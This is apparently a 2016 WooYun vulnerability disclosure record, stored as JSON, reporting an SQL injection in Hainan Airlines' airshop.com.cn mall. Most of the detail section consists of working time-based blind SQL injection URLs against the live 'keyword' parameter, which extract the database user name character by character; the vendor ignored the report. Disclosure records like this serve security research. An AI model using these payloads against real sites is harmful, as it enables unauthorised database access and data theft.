{"id": 86135, "wybug_id": "wooyun-2016-0205460", "wybug_title": "海南航空某站存在SQL注入", "wybug_corp": "海南航空", "wybug_author": "V1ct0r", "wybug_date": "2016-05-05 22:13", "wybug_open_date": "2016-05-10 22:20", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "13", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-05-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-05-10：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： ╮(╯_╰)╭  详细说明：  #0.存在注入的站点 http://www.airshop.com.cn/ 海南航空金鹏商城 #1.漏洞说明 http://www.airshop.com.cn/ffpclub/kingpeng_list.php Get keyword参数存在 MySQL基于时间的注入 这里对延时注入进行简单验证： http://www.airshop.com.cn/ffpclub/kingpeng_list.php?keyword=if%28now%28%29%3dsysdate%28%29%2csleep%280%29%2c0%29/*%27XOR%28if%28now%28%29%3dsysdate%28%29%2csleep%280%29%2c0%29%29OR%27%22XOR%28if%28now%28%29%3dsysdate%28%29%2csleep%280%29%2c0%29%29OR%22*/ \n\n \n\n \n\n #3.漏洞验证(这里跑出数据库的user信息)http://www.airshop.com.cn/ffpclub/kingpeng_list.php?keyword=if(now()=sysdate(),sleep(0),0)/*'XOR(if(ascii(substring(user(),1,1))=101,sleep(5),0))OR'\"XOR(if(now()=sysdate(),sleep(0),0))OR\"*/ehttp://www.airshop.com.cn/ffpclub/kingpeng_list.php?keyword=if(now()=sysdate(),sleep(0),0)/*%27XOR(if(ascii(substring(user(),2,1))=99,sleep(2),0))OR%27%22XOR(if(now()=sysdate(),sleep(0),0))OR%22*/chttp://www.airshop.com.cn/ffpclub/kingpeng_list.php?keyword=if(now()=sysdate(),sleep(0),0)/*%27XOR(if(ascii(substring(user(),3,1))=115,sleep(2),0))OR%27%22XOR(if(now()=sysdate(),sleep(0),0))OR%22*/shttp://www.airshop.com.cn/ffpclub/kingpeng_list.php?keyword=if(now()=sysdate(),sleep(0),0)/*%27XOR(if(ascii(substring(user(),4,1))=104,sleep(2),0))OR%27%22XOR(if(now()=sysdate(),sleep(0),0))OR%22*/hhttp://www.airshop.com.cn/ffpclub/kingpeng_list.php?keyword=if(now()=sysdate(),sleep(0),0)/*%27XOR(if(ascii(substring(user(),5,1))=111,sleep(2),0))OR%27%22XOR(if(now()=sysdate(),sleep(0),0))OR%22*/ohttp://www.airshop.com.cn/ffpclub/kingpeng_list.php?keyword=if(now()=sysdate(),sleep(0),0)/*%27XOR(if(ascii(substring(user(),6,1))=112,sleep(2),0))OR%27%22XOR(if(now()=sysdate(),sleep(0),0))OR%22*/p即数据库用户名为：ecshop（原来是使用的ecshop的程序...)   漏洞证明：  如上   修复方案：  过滤   版权声明：转载请注明来源 V1ct0r@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2016-05-10 22:20 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-05-05 23:40 |    \t\tVince、白 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:13        | 爱测试，爱代码，爱妹子)\t\t \n  表示也发现了，无奈未注入进去，不知道为什么    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}